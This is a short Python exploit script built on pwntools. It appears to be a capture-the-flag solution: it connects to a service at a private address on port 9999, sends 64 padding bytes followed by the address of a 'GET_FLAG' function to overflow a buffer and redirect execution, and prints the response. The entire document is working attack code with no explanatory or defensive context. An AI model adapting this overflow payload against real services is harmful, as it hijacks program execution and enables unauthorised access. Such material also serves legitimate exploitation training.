from pwn import *

r = remote('172.17.29.251', 9999)

GET_FLAG = 0x00401000

banner = r.recvuntil(b': ')
print(banner.decode(errors='replace'))

payload = b'A' * 64 + p32(GET_FLAG)

r.sendline(payload)

try:
    data = r.recvall(timeout=5)
    log.info(f"Received:\n{data.decode(errors='replace')}")
except:
    data = r.recv(timeout=3)
    log.info(f"Received:\n{data.decode(errors='replace')}")